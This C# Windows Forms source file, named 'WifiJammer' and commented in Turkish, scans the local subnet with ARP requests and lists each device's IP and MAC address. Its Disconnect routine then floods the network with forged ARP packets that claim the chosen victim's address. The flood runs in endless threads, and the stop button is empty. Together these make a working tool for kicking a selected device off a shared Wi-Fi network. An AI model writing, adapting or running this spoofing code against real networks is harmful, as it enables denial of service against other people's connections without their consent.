using System;
using System.Collections.Generic;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Linq;
using SharpPcap;
using PacketDotNet;
using System.Net.NetworkInformation;
using SharpPcap.AirPcap;
using SharpPcap.WinPcap;
using System.Windows.Forms;
namespace WifiJammer
{
    public partial class AnaForm : Form
    {
        public static Thread thr;
        public static Dictionary<IPAddress, PhysicalAddress> agListe = new Dictionary<IPAddress, PhysicalAddress>();
        [DllImport("iphlpapi.dll", ExactSpelling = true)]
        public static extern int SendARP(int hedefIP, int srcIP, byte[] macAdres, ref uint fizikselAdresUzunluk);//extern ile metodun harici dosyada oldugunu belirttik dolayısıyla derleyici kodu kaynak kodda aramayacaktır.
        public AnaForm()
        {
            InitializeComponent();
        }
        static void Tara(string baslangic, int eklenen)
        {
            string yeniIP = baslangic + eklenen;
            IPAddress hedefIP = IPAddress.Parse(yeniIP);
            byte[] bymacAdres = new byte[6];
            uint bymacAdresUZ = (uint)bymacAdres.Length;
            if (SendARP(BitConverter.ToInt32(hedefIP.GetAddressBytes(), 0), 0, bymacAdres, ref bymacAdresUZ) == 0)//burada iletişim sağlanırsa gönderilen ip adresi ile return 0 dönecektir sağlanmazs return 1 dönecektir bymacadresi send arp paketi ile dll içinde dizinin içerisin doldurduk
            {
                string macAddress;
                string[] str = new string[(int)bymacAdresUZ];
                for (int j = 0; j < bymacAdresUZ; j++)
                {
                    str[j] = bymacAdres[j].ToString("x2");//for döngüsü yardımıyla diiz elemanları tek tek kontroledilir ve tostring metoduyla 16lık tabanda hexadecimal formata cevrilir.
                }
                macAddress = (string.Join("-", str));//join metodu ile str dizisinin tüm elemanları araların - olacak şekilde birleştirilir.
                var fizCevrim = macAddress.ToUpper();//mac adresini burada fiziksel ceviriyoruz.mac adresi ile fiziksel adres arasındaki fark mac adresinin harfleri küçük fizikselin büyük
                PhysicalAddress fizikselAdres = PhysicalAddress.Parse(fizCevrim);
                agListe.Add(hedefIP, fizikselAdres);//burada sözlüğe ekliyoruz bunu 2 colonlu datagridview olarak ta düşünebiliriz 
            }
        }
        public static class DisconnectReconnect
        {
            private static Dictionary<IPAddress, PhysicalAddress> alikoyulanListe;
            private static bool bayrakSerbestMi = true;
            private static ICaptureDevice yakalamaAygiti;
            public static void Disconnect(Dictionary<IPAddress, PhysicalAddress> agListesi, IPAddress atılacakIP, PhysicalAddress atılacakMAC, string donanimIsmi)
            {
                alikoyulanListe = new Dictionary<IPAddress, PhysicalAddress>();//
                yakalamaAygiti = (from devicex in CaptureDeviceList.Instance where ((WinPcapDevice)devicex).Interface.FriendlyName == donanimIsmi select devicex).ToList()[0];//buradaki koddaki amacımız 
                yakalamaAygiti.Open();
                foreach (var hedef in agListesi)
                {
                    IPAddress IPAdres = ((WinPcapDevice)yakalamaAygiti).Addresses[1].Addr.ipAddress; 
                    ARPPacket ARPPaketi = new ARPPacket(ARPOperation.Request, PhysicalAddress.Parse("00-00-00-00-00-00"), atılacakIP, yakalamaAygiti.MacAddress, hedef.Key);
                    EthernetPacket EthernetPaketi = new EthernetPacket(yakalamaAygiti.MacAddress, atılacakMAC, EthernetPacketType.Arp);
                    EthernetPaketi.PayloadPacket = ARPPaketi;
                    new Thread(() =>
                    {
                        bayrakSerbestMi = false;
                        while (!bayrakSerbestMi)
                        {
                            yakalamaAygiti.SendPacket(EthernetPaketi);
                        }
                    }).Start();
                    alikoyulanListe.Add(hedef.Key, hedef.Value);
                };
            }
        }
        private void TSBtnCikis_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }
        private void AnaForm_Load(object sender, EventArgs e)
        {
            dataGridView1.ColumnCount = 5;
            dataGridView1.Columns[0].Name = "IP";
            dataGridView1.Columns[1].Name = "MAC";
            textBox1.Text = ".";
            TxtBaslangic.Text = IPAdresim();
            string[] parcalar= TxtBaslangic.Text.Split(textBox1.Text[0]);
            string newIP="";
            foreach (string i in parcalar)
            {
                listBox1.Items.Add(i);
            }
            for (int i = 0; i < 3; i++)
            {
                newIP= newIP+listBox1.Items[i].ToString()+".";
            }
            textBox1.Text = newIP;
        }
        public string IPAdresim()//modemin bana verdiği ip adresini buluoyr
        {
            string ip = null;
            IPHostEntry host;
            host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (IPAddress ipo in host.AddressList)
            {
                if (ipo.AddressFamily.ToString() == "InterNetwork")
                {
                    ip = ipo.ToString();
                }
            }
            return ip;
        }
        private void TBBtnTara_Click(object sender, EventArgs e)
        {
            string baslangicIp = textBox1.Text;
            for (int i = 1; i < 255; i++)//bu for un amacı ip taraması yapılırken 1 den 255 e kadar olan tüm ip adreslerine paket göndermek
            {
                var ekle = i;
                thr = new Thread(() => Tara(baslangicIp, ekle));//oluşan her yeni thr ile yeni bir tarama gerçekleştiriliyor arkaplanda
                thr.Start();
            }
            thr.Join();//bu method ile diğer bir thr nin çalışması engellenmiş olur yani 5 thr calısmaya basladıysa grup olarak bitirdikten sonra diğer thr ler calısacaktır.
            foreach (KeyValuePair<IPAddress, PhysicalAddress> pair in agListe)//agliste içindeki verilerimizi aktarıcaz verileri yazmak için pair e aktarıyoruz
            {
                dataGridView1.Rows.Add(pair.Key, pair.Value);//olusan pair ile verilerimizi datagrid e yazıyoruz
            }
        }
        private void TBBtnAt_Click(object sender, EventArgs e)
        {
            string seciliItemIP = dataGridView1.CurrentRow.Cells[0].Value.ToString();//dtg deki secili satırın 0.indexindeki değeri yani ip adresini seçiyoruz
            IPAddress ipoCeviri = IPAddress.Parse(seciliItemIP);
            string seciliItemMAC = dataGridView1.CurrentRow.Cells[1].Value.ToString();//dtg deki secili satırın 1.indexindeki değeri yani mac adresini seçiyoruz
            PhysicalAddress fizikselAdres = PhysicalAddress.Parse(seciliItemMAC);
            DisconnectReconnect.Disconnect(agListe, ipoCeviri, fizikselAdres, "Wi-Fi");//daha sonra bunları discon metoduna gönderiyoruz
        }
        private void TBBtnDurdur_Click(object sender, EventArgs e)
        {

        }
        private void TBBtnHSec_Click(object sender, EventArgs e)
        {
            dataGridView1.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
        }

        private void TSBtnTaramaBaslat_Click(object sender, EventArgs e)
        {
            string baslangicIp = textBox1.Text;
            for (int i = 1; i < 255; i++)
            {
                var ekle = i;
                thr = new Thread(() => Tara(baslangicIp, ekle));
                thr.Start();
            }
            thr.Join();
            foreach (KeyValuePair<IPAddress, PhysicalAddress> pair in agListe)
            {
                dataGridView1.Rows.Add(pair.Key, pair.Value);
            }
        }
    }
}
